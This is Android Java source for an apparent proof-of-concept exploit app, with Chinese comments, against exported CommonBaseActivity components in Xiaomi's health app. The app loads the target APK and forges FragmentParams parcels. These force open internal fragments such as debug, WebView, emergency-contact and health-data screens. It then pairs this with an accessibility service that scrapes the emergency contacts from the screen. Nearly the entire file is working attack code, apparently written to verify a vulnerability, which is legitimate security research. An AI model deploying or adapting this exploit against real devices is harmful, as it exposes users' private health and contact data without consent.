package com.example.commonbase.poc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.os.Handler;
import android.os.Looper;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.lang.reflect.Method;

/**
 * V-03 动态验证 POC：CommonBaseActivity 任意 BaseFragment 实例化。
 *
 * 两个 CommonBaseActivity 均导出且无权限：
 *   - com.xiaomi.fitness.baseui.common.CommonBaseActivity
 *   - com.xiaomi.fitness.devicesettings.base.CommonBaseActivity
 *
 * Activity 从 Intent extra "fragment_param" 读取 FragmentParams Parcelable，
 * 提取 className 后通过 Class.forName().newInstance() 反射实例化，
 * 调用 setArguments(bundle) 注入外部 Bundle。无类名白名单。
 *
 * 本 POC 通过 DexClassLoader 加载目标 APK，用 CREATOR.createFromParcel
 * 构造 FragmentParams 对象，不依赖混淆方法名。
 */
public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CommonBasePOC";
    private static final String TARGET_PKG = "com.mi.health";

    // 目标 Activity（两个导出的 CommonBaseActivity）
    private static final String ACT_BASEUI =
            "com.xiaomi.fitness.baseui.common.CommonBaseActivity";
    private static final String ACT_DEVICESETTINGS =
            "com.xiaomi.fitness.devicesettings.base.CommonBaseActivity";

    // 测试用 Fragment 类名（从反编译源码逐行核对）
    private static final String FRAG_WEAR_GUIDE =
            "com.xiaomi.fitness.devicesettings.guide.GuideWearInstructionFragment";
    private static final String FRAG_WEB_VIEW =
            "com.xiaomi.fitness.devicesettings.guide.GuideWebViewFragment";
    private static final String FRAG_DEBUG =
            "com.xiaomi.fitness.devicesettings.base.cta.DeviceInstallAPPDebugFragment";
    private static final String FRAG_EMERGENCY =
            "com.xiaomi.fitness.devicesettings.bluttooth.falldetection.EmergencyContactListFragment";
    private static final String FRAG_STEP_DATA =
            "com.xiaomi.fitness.health.step.StepFragment";
    private static final String FRAG_SLEEP_DATA =
            "com.xiaomi.fitness.health.sleep.ui.SleepFragment";
    private static final String FRAG_HEART_RATE_DATA =
            "com.xiaomi.fitness.health.hrm.HrmFragment";
    private static final String FRAG_WEIGHT_DATA =
            "com.xiaomi.fitness.health.weight.ui.WeightFragment";

    private TextView logView;
    private TextView tvStatus;

    // DexClassLoader 加载的目标 FragmentParams 类
    private Class<?> fragmentParamsClass;
    private Object fragmentParamsCreator;
    private boolean apkLoaded = false;

    // 当前选择的目标 Activity
    private String selectedActivity = ACT_BASEUI;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        logView = findViewById(R.id.logView);
        tvStatus = findViewById(R.id.tvStatus);
        logView.setMovementMethod(new ScrollingMovementMethod());

        // 选择目标 Activity
        findViewById(R.id.btnBaseUI).setOnClickListener(v -> {
            selectedActivity = ACT_BASEUI;
            logLine("已选择目标: " + ACT_BASEUI);
        });
        findViewById(R.id.btnDeviceSettings).setOnClickListener(v -> {
            selectedActivity = ACT_DEVICESETTINGS;
            logLine("已选择目标: " + ACT_DEVICESETTINGS);
        });

        // Fragment 注入测试
        findViewById(R.id.btnWearGuide).setOnClickListener(v ->
                sendFragment(FRAG_WEAR_GUIDE, null, "GuideWearInstructionFragment"));
        findViewById(R.id.btnWebView).setOnClickListener(v -> {
            Bundle bundle = new Bundle();
            bundle.putString("URL", "https://watch.iot.mi.com/");
            sendFragment(FRAG_WEB_VIEW, bundle, "GuideWebViewFragment");
        });
        findViewById(R.id.btnDebug).setOnClickListener(v ->
                sendFragment(FRAG_DEBUG, null, "DeviceInstallAPPDebugFragment"));
        findViewById(R.id.btnEmergency).setOnClickListener(v ->
                sendFragment(FRAG_EMERGENCY, null, "EmergencyContactListFragment"));
        findViewById(R.id.btnStepData).setOnClickListener(v ->
                sendFragment(FRAG_STEP_DATA, null, "StepFragment"));
        findViewById(R.id.btnSleepData).setOnClickListener(v ->
                sendFragment(FRAG_SLEEP_DATA, null, "SleepFragment"));
        findViewById(R.id.btnHeartRateData).setOnClickListener(v ->
                sendFragment(FRAG_HEART_RATE_DATA, null, "HrmFragment"));
        findViewById(R.id.btnWeightData).setOnClickListener(v ->
                sendFragment(FRAG_WEIGHT_DATA, null, "WeightFragment"));
        findViewById(R.id.btnCustom).setOnClickListener(v -> showCustomClassDialog());

        // 组合攻击：AccessibilityService 读取屏幕
        findViewById(R.id.btnOpenAccessibility).setOnClickListener(v -> {
            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            logLine("已跳转无障碍设置，请在列表中找到 CommonBasePOC 并开启");
        });
        findViewById(R.id.btnReadScreen).setOnClickListener(v -> {
            if (!ScreenReaderService.isActive()) {
                logLine("错误：无障碍服务未开启，请先点击上方按钮开启");
                return;
            }
            ScreenReaderService.clearCapturedTexts();
            logLine("===== 组合攻击：打开联系人页面 + 读取屏幕 =====");
            logLine("正在发送 EmergencyContactListFragment...");
            sendFragment(FRAG_EMERGENCY, null, "EmergencyContactListFragment");
            // 延迟 3 秒后读取屏幕数据
            new android.os.Handler().postDelayed(() -> {
                java.util.List<String> texts = ScreenReaderService.getCapturedTexts();
                logLine("===== AccessibilityService 读取到的屏幕数据 =====");
                if (texts.isEmpty()) {
                    logLine("（未读取到文本，可能 Fragment 尚未加载完成）");
                } else {
                    for (String text : texts) {
                        logLine("  > " + text);
                    }
                }
                logLine("===== 读取结束 =====\n");
            }, 3000);
        });

        // 可达性和无效类名测试
        findViewById(R.id.btnNullParam).setOnClickListener(v -> sendNullParam());
        findViewById(R.id.btnInvalidClass).setOnClickListener(v ->
                sendFragment("com.fake.NotExist", null, "无效类名"));

        findViewById(R.id.btnClear).setOnClickListener(v -> logView.setText(""));

        // 打印身份信息
        printIdentity();

        // 加载目标 APK
        loadTargetApk();
    }

    // ==================== 加载目标 APK ====================

    private void loadTargetApk() {
        logLine("========== 加载目标 APK ==========");
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(TARGET_PKG, 0);
            String apkPath = info.sourceDir;
            logLine("目标 APK: " + apkPath);

            String odexDir = getCacheDir().getPath();
            ClassLoader parentLoader = getClassLoader();

            // 使用 DexClassLoader 加载目标 APK
            Class<?> dclClass = Class.forName("dalvik.system.DexClassLoader");
            java.lang.reflect.Constructor<?> ctor =
                    dclClass.getConstructor(String.class, String.class, String.class, ClassLoader.class);
            Object dexLoader = ctor.newInstance(apkPath, odexDir, null, parentLoader);

            // 加载 FragmentParams 类
            Method loadClass = dclClass.getMethod("loadClass", String.class);
            fragmentParamsClass = (Class<?>) loadClass.invoke(dexLoader,
                    "com.xiaomi.fitness.baseui.common.FragmentParams");
            logLine("FragmentParams 类已加载: " + fragmentParamsClass.getName());

            // 获取 CREATOR（public static field）
            Field creatorField = fragmentParamsClass.getField("CREATOR");
            fragmentParamsCreator = creatorField.get(null);
            logLine("CREATOR 已获取: " + fragmentParamsCreator.getClass().getName());

            apkLoaded = true;
            tvStatus.setText("APK 已加载，可以执行验证");
            logLine("========== 加载成功 ==========\n");
        } catch (Exception e) {
            apkLoaded = false;
            tvStatus.setText("APK 加载失败: " + e.getMessage());
            logLine("加载失败: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            Log.e(TAG, "loadTargetApk failed", e);
        }
    }

    // ==================== 构造 FragmentParams ====================

    /**
     * 用 CREATOR.createFromParcel 构造 FragmentParams，不依赖混淆的方法名。
     *
     * FragmentParams.writeToParcel 格式（从反编译源码确认）：
     *   parcel.writeByte(backAble ? 1 : 0)   // boolean
     *   parcel.writeBundle(bundle)            // Bundle
     *   parcel.writeString(className)         // String
     *   parcel.writeByte(isResizeMode ? 1 : 0) // boolean
     *
     * CREATOR.createFromParcel 调用 private FragmentParams(Parcel) 读取相同顺序。
     */
    private Parcelable buildFragmentParams(String className, Bundle bundle, boolean backAble) {
        if (!apkLoaded) {
            logLine("错误: APK 未加载，无法构造 FragmentParams");
            return null;
        }

        if (bundle == null) {
            bundle = new Bundle();
        }

        try {
            // 创建 Parcel 并按 FragmentParams.writeToParcel 顺序写入
            Parcel parcel = Parcel.obtain();
            parcel.writeByte(backAble ? (byte) 1 : (byte) 0);  // backAble
            parcel.writeBundle(bundle);                         // bundle
            parcel.writeString(className);                      // className
            parcel.writeByte((byte) 0);                         // isResizeMode = false

            // 重置读取位置
            parcel.setDataPosition(0);

            // 调用 CREATOR.createFromParcel(Parcel)
            Method createFromParcel = fragmentParamsCreator.getClass()
                    .getMethod("createFromParcel", Parcel.class);
            Object params = createFromParcel.invoke(fragmentParamsCreator, parcel);

            parcel.recycle();

            if (params instanceof Parcelable) {
                Log.d(TAG, "FragmentParams 构造成功: className=" + className);
                return (Parcelable) params;
            } else {
                logLine("错误: 构造结果不是 Parcelable: " + params);
                return null;
            }
        } catch (Exception e) {
            logLine("构造 FragmentParams 失败: " + e.getClass().getSimpleName()
                    + ": " + e.getMessage());
            Log.e(TAG, "buildFragmentParams failed", e);
            return null;
        }
    }

    // ==================== 发送 Intent ====================

    /**
     * 构造 FragmentParams 并发送到目标 Activity。
     */
    private void sendFragment(String className, Bundle bundle, String label) {
        logLine("===== 发送 Fragment: " + label + " =====");
        logLine("  目标 Activity: " + selectedActivity);
        logLine("  Fragment 类名: " + className);
        if (bundle != null) {
            logLine("  Bundle keys: " + bundle.keySet());
        }

        Parcelable params = buildFragmentParams(className, bundle, true);
        if (params == null) {
            logLine("  构造 FragmentParams 失败，终止\n");
            return;
        }

        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(TARGET_PKG, selectedActivity));
            intent.putExtra("fragment_param", params);

            startActivity(intent);
            logLine("  Intent 已发送，观察目标应用是否打开 Fragment");
            logLine("  查看 logcat: adb logcat -d | grep -iE \"CommonBaseActivity|fragmentParam|target fragment\"\n");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage() + "\n");
        } catch (Exception e) {
            logLine("  发送失败: " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n");
        }
    }

    /**
     * 发送不带 fragment_param 的 Intent，验证 Activity 是否可被外部启动。
     */
    private void sendNullParam() {
        logLine("===== 发送空 fragment_param =====");
        logLine("  目标 Activity: " + selectedActivity);
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(TARGET_PKG, selectedActivity));
            startActivity(intent);
            logLine("  Intent 已发送（无 fragment_param）");
            logLine("  预期: Activity 启动后显示\"页面不存在\"或直接 finish");
            logLine("  查看 logcat: adb logcat -d | grep -iE \"CommonBaseActivity|fragmentParam\"\n");
        } catch (SecurityException e) {
            logLine("  SecurityException: " + e.getMessage() + "\n");
        } catch (Exception e) {
            logLine("  发送失败: " + e.getClass().getSimpleName() + ": " + e.getMessage() + "\n");
        }
    }

    // ==================== 自定义类名对话框 ====================

    private void showCustomClassDialog() {
        final android.widget.EditText input = new android.widget.EditText(this);
        input.setHint("com.xiaomi.fitness.xxx.XxxFragment");
        new AlertDialog.Builder(this)
                .setTitle("输入自定义 Fragment 类名")
                .setView(input)
                .setPositiveButton("发送", (d, w) -> {
                    String className = input.getText().toString().trim();
                    if (!className.isEmpty()) {
                        sendFragment(className, null, "自定义: " + className);
                    }
                })
                .setNegativeButton("取消", null)
                .show();
    }

    // ==================== 辅助 ====================

    private void printIdentity() {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo self = pm.getApplicationInfo(getPackageName(), 0);
            logLine("===== 测试应用身份 =====");
            logLine("包名: " + getPackageName());
            logLine("UID: " + self.uid);
            logLine("签名: debug 签名 (非小米签名)");

            ApplicationInfo target = pm.getApplicationInfo(TARGET_PKG, 0);
            logLine("===== 目标应用身份 =====");
            logLine("包名: " + TARGET_PKG);
            logLine("UID: " + target.uid);
            logLine("");
        } catch (Exception e) {
            logLine("获取身份信息失败: " + e.getMessage());
        }
    }

    private void logLine(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> {
            logView.append(msg);
            logView.append("\n");
        });
    }
}
